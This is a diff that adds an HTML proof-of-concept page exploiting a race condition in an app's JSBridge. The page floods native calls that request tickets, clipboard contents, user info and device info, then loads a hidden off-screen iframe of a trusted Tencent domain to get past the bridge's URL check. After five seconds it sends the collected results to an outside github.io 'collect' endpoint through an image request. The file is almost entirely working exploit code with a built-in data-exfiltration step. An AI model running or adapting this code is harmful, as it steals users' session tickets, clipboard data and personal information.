@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Race PoC v2</title></head>
+<body>
+<h2>JSBridge Race Condition PoC v2</h2>
+<p>策略：先发送 JSBridge 调用，再用 iframe 加载合法域名来改变 real_time_url</p>
+<pre id="log" style="font-size:12px;max-height:80vh;overflow:auto;"></pre>
+<script>
+var log = document.getElementById('log');
+function addLog(s) {
+    var line = '[' + Date.now() + '] ' + s;
+    log.textContent += line + '\n';
+    log.scrollTop = log.scrollHeight;
+}
+
+// JSBridge 回调收集器
+var results = {};
+window.__JSBRIDGE_RESULTS = results;
+
+function callJSBridge(module, method, params, callback) {
+    var callId = module + '_' + method + '_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
+
+    // 注册回调
+    window[callId] = function(resp) {
+        addLog('✓ CALLBACK: ' + module + '.' + method + ' → ' + JSON.stringify(resp).substring(0, 200));
+        results[module + '.' + method] = resp;
+        if (callback) callback(resp);
+    };
+
+    var msg = JSON.stringify({
+        module: module,
+        method: method,
+        event_name: callId,
+        params: params || {}
+    });
+
+    try {
+        JSCallJavaMgr.JSCallNative(module, msg);
+        return true;
+    } catch(e) {
+        addLog('ERR: ' + e);
+        return false;
+    }
+}
+
+function startRace() {
+    addLog('=== PoC v2 Start ===');
+    addLog('Current URL: ' + location.href);
+
+    // 第1步：连续发送敏感 JSBridge 调用
+    var targets = [
+        ['CommonPlugin', 'GetTicket', {ticket_type: 0}],
+        ['CommonPlugin', 'GetTicket', {ticket_type: 1}],
+        ['CommonPlugin', 'GetTicket', {ticket_type: 2}],
+        ['CommonPlugin', 'GetClipboard', {}],
+        ['CommonPlugin', 'GetCurrentPageTicket', {}],
+        ['DevicePlugin', 'GetDeviceInfo', {}],
+        ['CommonPlugin', 'GetUserInfo', {}],
+        ['CommonPlugin', 'GetNonceStr', {}],
+    ];
+
+    addLog('Sending ' + targets.length + ' JSBridge calls...');
+    for (var i = 0; i < targets.length; i++) {
+        var t = targets[i];
+        callJSBridge(t[0], t[1], t[2]);
+    }
+    // 额外重复发送，增加命中概率
+    for (var j = 0; j < 3; j++) {
+        for (var i = 0; i < targets.length; i++) {
+            var t = targets[i];
+            callJSBridge(t[0], t[1], t[2]);
+        }
+    }
+    addLog('Total ' + (targets.length * 4) + ' calls sent');
+
+    // 第2步：立刻用 iframe 加载合法域名
+    // 这会触发 LoadUrl → 更新 real_time_url，但不会离开当前页面
+    addLog('Injecting iframe with meeting.tencent.com...');
+    var iframe = document.createElement('iframe');
+    iframe.style.width = '1px';
+    iframe.style.height = '1px';
+    iframe.style.position = 'absolute';
+    iframe.style.left = '-9999px';
+    iframe.src = 'https://meeting.tencent.com/';
+    document.body.appendChild(iframe);
+
+    addLog('Waiting for callbacks...');
+
+    // 第3步：等待回调
+    setTimeout(function() {
+        addLog('');
+        addLog('=== Results after 5s ===');
+        var keys = Object.keys(results);
+        if (keys.length === 0) {
+            addLog('No callbacks received :(');
+        } else {
+            addLog(keys.length + ' callbacks received!');
+            for (var i = 0; i < keys.length; i++) {
+                addLog('  ' + keys[i] + ': ' + JSON.stringify(results[keys[i]]).substring(0, 300));
+            }
+        }
+
+        // 尝试外传结果
+        try {
+            var img = new Image();
+            img.src = 'https://zhuos6678-test.github.io/huiyitest112233.github.io/collect?data=' +
+                      encodeURIComponent(JSON.stringify(results)).substring(0, 2000);
+        } catch(e) {}
+    }, 5000);
+
+    // 10秒后再检查一次
+    setTimeout(function() {
+        addLog('');
+        addLog('=== Final results after 10s ===');
+        var keys = Object.keys(results);
+        addLog(keys.length + ' total callbacks');
+        for (var i = 0; i < keys.length; i++) {
+            addLog('  ' + keys[i] + ': ' + JSON.stringify(results[keys[i]]).substring(0, 300));
+        }
+    }, 10000);
+}
+
+// 延迟启动，等 JSBridge 接口注册
+setTimeout(function() {
+    addLog('Starting in 2s...');
+    setTimeout(startRace, 2000);
+}, 1000);
+</script>
+</body>
+</html>
